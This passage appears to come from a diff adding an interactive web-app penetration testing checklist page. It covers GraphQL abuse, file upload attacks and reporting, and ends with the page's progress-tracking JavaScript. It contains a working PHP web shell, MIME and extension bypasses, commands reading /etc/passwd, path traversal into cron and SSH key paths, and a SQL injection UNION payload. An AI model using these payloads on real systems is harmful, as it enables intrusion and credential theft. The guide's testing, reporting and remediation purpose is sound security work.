\"verified\":true          ←\n}\n\n# API version bypass\nGET /api/v2/admin/users HTTP/1.1   ← 403\nGET /api/v1/admin/users HTTP/1.1   ← might work on old version"}],"infos":[]},{"id":"s19c","title":"19.3 GraphQL Security Testing","steps":["Run introspection query to map entire schema","Test if introspection is disabled (should be in production)","Identify all queries and mutations from schema","Test each mutation for authorization: can low-priv user call admin mutations?","Test for batch query attacks to bypass rate limiting","Test for SQL/NoSQL injection in GraphQL arguments"],"codes":[{"lang":"http","code":"# Introspection query — map full schema\nPOST /graphql HTTP/1.1\nContent-Type: application/json\n\n{\"query\":\"{ __schema { types { name fields { name type { name } } } } }\"}\n\n# Test unauthorized mutation\nPOST /graphql HTTP/1.1\nAuthorization: Bearer LOW_PRIV_TOKEN\n\n{\"query\":\"mutation { deleteUser(id: 1042) { success } }\"}\n\n# Batch query attack (bypass rate limits)\nPOST /graphql HTTP/1.1\n[\n  {\"query\":\"{ user(id:1) { email password } }\"},\n  {\"query\":\"{ user(id:2) { email password } }\"},\n  {\"query\":\"{ user(id:3) { email password } }\"}\n]"}],"infos":[]}]},{"id":"s20","icon":"📁","title":"File Upload Vulnerabilities","tag":"INJECTION / RCE","badges":[{"t":"CWE-434","c":"b-in"},{"t":"CRITICAL","c":"b-cr"}],"subs":[{"id":"s20a","title":"20.1 Unrestricted File Upload","steps":["Identify all file upload functionality in the application","Attempt to upload a PHP web shell with .php extension","If .php blocked, try alternative extensions: .php3, .php5, .phtml, .pht, .shtml","Try double extension bypass: shell.php.jpg","Modify Content-Type header to image/jpeg while uploading .php file","Add valid image magic bytes (JPEG: FF D8 FF) before PHP code","Embed PHP in image EXIF metadata using exiftool","Try null byte injection in filename: shell.php%00.jpg","Locate the uploaded file and execute it by browsing to /uploads/shell.php"],"codes":[{"lang":"php","code":"<?php system($_GET['cmd']); ?>"},{"lang":"http","code":"# Upload web shell — modify Content-Type in Burp\nPOST /upload HTTP/1.1\nContent-Type: multipart/form-data; boundary=----Boundary\n\n------Boundary\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\nContent-Type: image/jpeg          ← spoof MIME type\n\n<?php system($_GET['cmd']); ?>\n------Boundary--\n\n# After upload, execute:\nGET /uploads/shell.php?cmd=id HTTP/1.1\nGET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1\nGET /uploads/shell.php?cmd=whoami HTTP/1.1"},{"lang":"bash","code":"# Embed PHP in image EXIF metadata\nexiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' photo.jpg -o shell.jpg\n\n# Alternative extensions to try\nshell.php3, shell.php4, shell.php5, shell.phtml, shell.pht\nshell.PhP (case), shell.php;.jpg, shell.php%00.jpg\n\n# Find upload directory\n/uploads/, /files/, /media/, /attachments/, /tmp/, /images/"}],"payloads":["shell.php","shell.php3","shell.phtml","shell.php.jpg","shell.php%00.jpg"],"infos":[{"type":"warn","text":"Always confirm uploaded shell execution in a non-destructive way (whoami or id) before proceeding. Never upload destructive payloads."}]},{"id":"s20b","title":"20.2 Path Traversal in File Names","steps":["Intercept file upload request in Burp","Modify the filename parameter to include directory traversal sequences","Try to write files to web root, cron directories, or SSH authorized_keys","Test encoded variants of path traversal"],"codes":[{"lang":"http","code":"# Path traversal in filename\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../var/www/html/shell.php\"\nContent-Disposition: form-data; name=\"file\"; filename=\"..%2F..%2Fetc%2Fcron.d%2Fshell\"\n\n# Encoded variants\n../          %2e%2e%2f    ..%2f    %2e%2e/\n....//       ....\\\\     ..%c0%af"}],"infos":[]}]},{"id":"s21","icon":"📝","title":"Reporting & Remediation","tag":"DOCUMENTATION","badges":[{"t":"NIST SP 800-115","c":"b-ni"}],"subs":[{"id":"s21a","title":"21.1 CVSS Severity Scoring","steps":["Calculate CVSS v3.1 score for each finding at https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator","Document Attack Vector, Complexity, Privileges Required, User Interaction","Document Confidentiality, Integrity, and Availability impact","Assign severity label based on score"],"codes":[],"table":{"cols":["Severity","CVSS Score","Example Finding"],"rows":[["Critical","9.0 – 10.0","Unauthenticated RCE, Auth Bypass to Admin"],["High","7.0 – 8.9","SQLi, Stored XSS, SSRF with cloud metadata, IDOR on PII"],["Medium","4.0 – 6.9","CSRF, Reflected XSS, Self-XSS, Missing security headers"],["Low","0.1 – 3.9","Verbose errors, Version disclosure, Weak password policy"],["Informational","N/A","Best practice recommendations, defense-in-depth"]]},"infos":[]},{"id":"s21b","title":"21.2 Finding Report Checklist","steps":["Write a one-paragraph executive summary for each finding","Document exact Steps to Reproduce (numbered, precise, reproducible)","Capture the exact HTTP request and response as proof of concept","Calculate and document CVSS v3.1 score and vector string","Reference applicable CWE number and OWASP category","Document business impact in non-technical language","Provide specific, actionable remediation steps (not generic advice)","Include code-level remediation examples where possible","Add references: CVE, OWASP link, vendor advisory, NIST control"],"codes":[{"lang":"text","code":"FINDING TEMPLATE:\n─────────────────────────────────────────────\nTitle:      [Vuln Type] in [Endpoint/Function]\nSeverity:   Critical / High / Medium / Low\nCVSS Score: 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\nCWE:        CWE-89 (SQL Injection)\nOWASP:      A03:2021 – Injection\n\nSummary:\nThe /products endpoint is vulnerable to SQL injection via the\n'id' GET parameter. An unauthenticated attacker can extract\nall database contents including user credentials.\n\nSteps to Reproduce:\n1. Navigate to https://target.com/products?id=1\n2. Append a single quote: ?id=1'\n3. Observe SQL error in response\n4. Inject: ?id=-1 UNION SELECT username,password FROM users--\n\nProof of Concept: [request/response screenshot]\n\nImpact:\nComplete database compromise. Attacker can extract all user\ncredentials, PII, and potentially achieve RCE via INTO OUTFILE.\n\nRemediation:\nUse parameterized queries (prepared statements). Example:\n  $stmt = $pdo->prepare(\"SELECT * FROM products WHERE id = ?\");\n  $stmt->execute([$id]);\n\nReferences:\n  https://owasp.org/www-community/attacks/SQL_Injection\n  https://cwe.mitre.org/data/definitions/89.html"}],"infos":[]},{"id":"s21c","title":"21.3 Remediation Reference","steps":["Verify all findings have specific remediation steps documented","Validate severity ratings against CVSS calculator","Have findings peer-reviewed before delivery","Provide executive summary for non-technical stakeholders"],"codes":[],"table":{"cols":["Vulnerability","Primary Remediation"],"rows":[["SQL Injection","Parameterized queries / prepared statements; never string concatenation"],["XSS","Output encoding (HTML entity encode); Content-Security-Policy header"],["CSRF","Synchronizer token pattern; SameSite=Strict cookies"],["IDOR","Server-side authorization check on every request; indirect references"],["XXE","Disable external entity processing in XML parser config"],["SSRF","Allowlist outbound destinations; block RFC 1918 + metadata IPs"],["File Upload","Extension allowlist + MIME validation; store on separate domain"],["Broken Auth","Implement MFA; rate limiting; secure session management"],["CORS","Explicit allowlist — never reflect Origin header; deny null"],["JWT Issues","Verify algorithm; use asymmetric keys; validate all claims"]]},"infos":[]}]}]</script>
+
+<script>
+// ── STATE ─────────────────────────────────────────────────
+const SK = 'pentestv4';
+let ST = {};
+try { ST = JSON.parse(localStorage.getItem(SK)) || {}; } catch(e) { ST = {}; }
+function save(){ localStorage.setItem(SK, JSON.stringify(ST)); }
+function done(id){ return !!ST[id]; }
+
+// ── LOAD DATA ─────────────────────────────────────────────
+const GUIDE = JSON.parse(document.getElementById('gd').textContent);
+
+// ── PROGRESS ──────────────────────────────────────────────
+function secStepIds(sec){
+  let ids=[];
+  sec.subs.forEach(sub=>sub.steps.forEach((_,i)=>ids.push(sub.id+'_'+i)));
+  return ids;
+}
+function secProg(sec){
+  const ids=secStepIds(sec);
+  if(!ids.length) return {d:0,t:0,p:100};
+  const d=ids.filter(id=>ST[id]).length;
+  return {d,t:ids.length,p:Math.round(d/ids.length*100)};
+}
+function subProg(sub){
+  if(!sub.steps.length) return {d:0,t:0,p:100};
+  const d=sub.steps.filter((_,i)=>ST[sub.id+'_'+i]).length;
+  return {d,t:sub.steps.length,p:Math.round(d/sub.steps.length*100)};
+}
+function globalProg(){
+  let t=0,d=0;
+  GUIDE.forEach(s=>{const p=secProg(s);t+=p.t;d+=p.d;});
+  return t?Math.round(d/t*100):0;
+}
+
+// ── HELPERS ───────────────────────────────────────────────
+function esc(s){
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+// ── RENDER ────────────────────────────────────────────────
+function renderSidebar(){
+  document.getElementById('sidebar').innerHTML = GUIDE.map(sec=>{
+    const p=secProg(sec);
+    return `<a class="sbi" href="#${esc(sec.id)}" onclick="setSBActive(this)">
+      <span class="sbi-ic">${esc(sec.icon)}</span>
+      <span class="sbi-tx">${esc(sec.title)}</span>
+      <span class="sbi-pc" id="sbp_${esc(sec.id)}">${p.p}%</span>
+    </a>
+    <div class="sbbar"><div class="sbbf" id="sbf_${esc(sec.id)}" style="width:${p.p}%"></div></div>
+    <div class="sbdv"></div>`;
+  }).join('');
+}
+
+function renderCode(cb, idx, subId){
+  const uid = 'c_'+subId+'_'+idx;
+  return `<div class="cb">
+    <div class="cbhdr">
+      <div class="cbdots"><div class="cdd dr"></div><div class="cdd dy"></div><div class="cdd dg"></div></div>
+      <span class="cblang">${esc(cb.lang)}</span>
+      <button class="cpbtn" data-uid="${esc(uid)}" onclick="copyCode(this)">Copy</button>
+    </div>
+    <div class="cbpre"><pre id="${esc(uid)}">${esc(cb.code)}</pre></div>
+  </div>`;
+}
+
+function renderSection(sec){
+  const p=secProg(sec);
+  const badges=(sec.badges||[]).map(b=>`<span class="bdg ${esc(b.c)}">${esc(b.t)}</span>`).join('');
+  const subs=sec.subs.map(sub=>{
+    const sp=subProg(sub);
+    const stepsHtml=sub.steps.map((st,i)=>{
+      const sid=sub.id+'_'+i;
+      const isDone=done(sid);
+      return `<li class="step${isDone?' done':''}" data-sid="${esc(sid)}" onclick="toggleStep(this)">
+        <div class="stepbox"></div>
+        <span class="stepnum">0${i+1}</span>
+        <span class="steptxt">${esc(st)}</span>
+      </li>`;
+    }).join('');
+    const codesHtml=(sub.codes||[]).map((cb,ci)=>renderCode(cb,ci,sub.id)).join('');
+    const payloads=(sub.payloads||[]).map(p=>`<span class="ptag" data-payload="${esc(p)}" onclick="copyPayload(this)">${esc(p)}</span>`).join('');
+    const payloadHtml=payloads?`<div style="margin:8px 0 4px"><span style="font-family:var(--mono);font-size:9px;letter-spacing:.1em;color:var(--txtm);text-transform:uppercase">Quick-Copy Payloads</span></div><div class="plist">${payloads}</div>`:'';
+    const infosHtml=(sub.infos||[]).map(inf=>`<div class="ib${inf.type==='warn'?' wb':''}"><div class="ib-ic">${inf.type==='warn'?'⚠️':'💡'}</div><div class="ib-tx">${esc(inf.text)}</div></div>`).join('');
+    const tableHtml=sub.table?`<div style="overflow-x:auto;margin:10px 0"><table class="dt"><thead><tr>${sub.table.cols.map(c=>`<th>${esc(c)}</th>`).join('')}</tr></thead><tbody>${sub.table.rows.map(row=>`<tr>${row.map(cell=>`<td>${esc(cell)}</td>`).join('')}</tr>`).join('')}</tbody></table></div>`:'';
+    const noteVal=ST['n_'+sub.id]||'';
+    return `<div class="sub open" id="sub_${esc(sub.id)}">
+      <div class="subhdr" onclick="toggleSub('sub_${esc(sub.id)}')">
+        <div class="subtit">${esc(sub.title)}</div>
+        <div class="subpr">
+          <span class="subcnt" id="sc_${esc(sub.id)}">${sp.d}/${sp.t}</span>
+          <div class="submb"><div class="submf" id="smf_${esc(sub.id)}" style="width:${sp.p}%"></div></div>
+        </div>
+        <div class="chev">▾</div>
+      </div>
+      <div class="subbody">
+        ${sub.steps.length?`<ul class="steps">${stepsHtml}</ul>`:''}
+        ${codesHtml}${payloadHtml}${infosHtml}${tableHtml}
+        <div class="notesw">
+          <div class="noteslbl">📝 Notes</div>
+          <textarea class="notesta" placeholder="Add findings, evidence, tool output..." data-nid="${esc(sub.id)}" oninput="saveNote(this)">${esc(noteVal)}</textarea>
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+  return `<section class="sec${p.t>0&&p.d===p.t?' alldone':''}" id="${esc(sec.id)}">
+    <div class="sechdr">
+      <div class="secicw">${esc(sec.icon)}</div>
+      <div class="sectw">
+        <div class="sectag">${esc(sec.tag)}</div>
+        <div class="sectit">${esc(sec.title)}</div>
+        <div class="secmt">${badges}<span class="secdone">✓ Complete</span></div>
+      </div>
+      <div class="secpr">
+        <span class="secpct" id="spct_${esc(sec.id)}">${p.p}%</span>
+        <div class="secmb"><div class="secmf" id="smfs_${esc(sec.id)}" style="width:${p.p}%"></div></div>
+      </div>
+    </div>
+    ${subs}
+  </section>`;
+}
+
+function renderMain(){
+  document.getElementById('main').innerHTML =
+    GUIDE.map(renderSection).join('') +
+    '<div class="nores" id="nores">No steps match your search.</div>';
+}
+
+// ── UPDATE PROGRESS ────────────────────────────────────────
+function updateProgress(){
+  const gp=globalProg();
+  document.getElementById('gFill').style.width=gp+'%';
+  document.getElementById('gPct').textContent=gp+'%';
+  GUIDE.forEach(sec=>{
+    const p=secProg(sec);
+    const el=document.getElementById(sec.id);
+    if(el) el.classList.toggle('alldone',p.t>0&&p.d===p.t);
+    const spct=document.getElementById('spct_'+sec.id);
+    if(spct) spct.textContent=p.p+'%';
+    const smfs=document.getElementById('smfs_'+sec.id);
+    if(smfs) smfs.style.width=p.p+'%';
+    const sbp=document.getElementById('sbp_'+sec.id);
+    if(sbp) sbp.textContent=p.p+'%';
+    const sbf=document.getElementById('sbf_'+sec.id);
+    if(sbf) sbf.style.width=p.p+'%';
+    sec.subs.forEach(sub=>{
+      const sp=subProg(sub);
+      const sc=document.getElementById('sc_'+sub.id);
+      if(sc) sc.textContent=sp.d+'/'+sp.t;
+      const smf=document.getElementById('smf_'+sub.id);
+      if(smf) smf.style.width=sp.p+'%';
+    });
+  });
+}
+
+// ── INTERACTIONS ───────────────────────────────────────────
+function toggleStep(el){
+  const sid=el.dataset.sid;
+  ST[sid]=!ST[sid];
+  el.classList.toggle('done',ST[sid]);
+  save();
+  updateProgress();
+}
+
+function toggleSub(id){
+  document.getElementById(id).classList.toggle('open');
+}
+
+function setSBActive(el){
+  document.querySelectorAll('.sbi').forEach(a=>a.classList.remove('active'));
+  el.classList.add('active');
+}
+
+function saveNote(ta){
+  ST['n_'+ta.dataset.nid]=ta.value;
+  save();
+}
+
+function copyCode(btn){
+  const uid=btn.dataset.uid;
+  const txt=document.getElementById(uid).textContent;
+  navigator.clipboard.writeText(txt).then(()=>{
+    btn.textContent='✓ Copied';
+    btn.classList.add('ok');
+    setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('ok');},1800);
+  });
+}
+
+function copyPayload(el){
+  const p=el.dataset.payload;
+  navigator.clipboard.writeText(p).then(()=>{
+    const orig=el.textContent;
+    el.textContent='✓ Copied!';
+    setTimeout(()=>el.textContent=orig,1500);
+    showToast('Payload copied');
+  });
+}
+
+function showToast(msg){
+  const t=document.getElementById('toast');
+  t.textContent=msg;
+  t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),2200);
+}
+
+function exportProg(){
+  const gp=globalProg();
+  const lines=[`WebApp Pentest Guide — Progress Export`,`Generated: ${new Date().toISOString()}`,`Overall: ${gp}%`,'='.repeat(50)];
+  GUIDE.forEach(sec=>{
+    const p=secProg(sec);
+    lines.push(`\n${sec.icon} ${sec.title} — ${p.p}% (${p.d}/${p.t})`);
+    sec.subs.forEach(sub=>{
+      lines.push(`  ${sub.title}`);
+      sub.steps.forEach((st,i)=>lines.push(`    [${ST[sub.id+'_'+i]?'✓':' '}] ${st}`));
+      const n=ST['n_'+sub.id];
+      if(n) lines.push(`    📝 ${n}`);
+    });
+  });
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([lines.join('\n')],{type:'text/plain'}));
+  a.download=`pentest_${new Date().toISOString().slice(0,10)}.txt`;
+  a.click();
+  showToast('Exported!');
+}
+
+function doReset(){
+  if(confirm('Reset ALL progress and notes?')){
+    ST={};save();
+    document.querySelectorAll('.step').forEach(el=>el.classList.remove('done'));
+    document.querySelectorAll('.notesta').forEach(ta=>ta.value='');
+    updateProgress();
+    showToast('Progress reset');
+  }
+}
+
+// ── SEARCH ────────────────────────────────────────────────
+document.getElementById('srch').addEventListener('input',function(){
+  const q=this.value.toLowerCase().trim();
+  let any=false;
+  document.querySelectorAll('.sec').forEach(secEl=>{
+    let secVis=false;
+    secEl.querySelectorAll('.sub').forEach(subEl=>{
+      let subVis=false;
+      subEl.querySelectorAll('.step').forEach(stepEl=>{
+        const txt=stepEl.querySelector('.steptxt').textContent.toLowerCase();
+        const m=!q||txt.includes(q);
+        stepEl.style.display=m?'':'none';
+        if(m) subVis=true;
+      });
+      subEl.querySelectorAll('.cb').forEach(cb=>cb.style.display=q?'none':'');
+      subEl.style.display=(subVis||!q)?'':'none';
+      if(subVis) secVis=true;
+    });
+    secEl.style.display=(secVis||!q)?'':'none';
+    if(secVis||!q) any=true;
+  });
+  document.getElementById('nores').style.display=(!any&&q)?'block':'none';
+});
+
+// ── SCROLL SPY ────────────────────────────────────────────
+function setupScrollSpy(){
+  const obs=new IntersectionObserver(entries=>{
+    entries.forEach(e=>{
+      if(e.isIntersecting){
+        document.querySelectorAll('.sbi').forEach(a=>{
+          a.classList.toggle('active',a.getAttribute('href')==='#'+e.target.id);
+        });
+      }
+    });
+  },{rootMargin:'-25% 0px -65% 0px'});
+  document.querySelectorAll('.sec').forEach(s=>obs.observe(s));
+}
+
+// ── INIT ──────────────────────────────────────────────────
+renderSidebar();
+renderMain();
+updateProgress();
+setupScrollSpy();
+</script>
+</body>
+</html>
